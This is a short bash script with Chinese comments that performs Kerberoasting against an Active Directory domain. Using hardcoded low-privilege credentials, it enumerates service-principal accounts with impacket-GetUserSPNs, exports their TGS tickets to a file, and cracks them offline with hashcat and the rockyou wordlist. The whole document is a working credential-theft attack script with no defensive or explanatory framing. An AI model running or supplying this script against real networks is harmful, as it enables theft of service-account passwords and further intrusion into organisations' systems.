#!/bin/bash
# Kerberoasting SPN 票据破解脚本

DC_IP="192.168.1.10"
DOMAIN="corp.local"
USER="lowpriv_user"
PASS="Password123!"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] 第一步：枚举域内 SPN 账户"
impacket-GetUserSPNs \
    ${DOMAIN}/${USER}:${PASS} \
    -dc-ip ${DC_IP} \
    -request

echo ""
echo "[*] 第二步：导出 TGS 票据到文件"
impacket-GetUserSPNs \
    ${DOMAIN}/${USER}:${PASS} \
    -dc-ip ${DC_IP} \
    -request \
    -outputfile tgs_hashes.txt

echo ""
echo "[*] 第三步：使用 hashcat 破解 TGS 票据"
hashcat -m 13100 tgs_hashes.txt ${WORDLIST} --force

echo ""
echo "[*] 查看破解结果"
hashcat -m 13100 tgs_hashes.txt --show
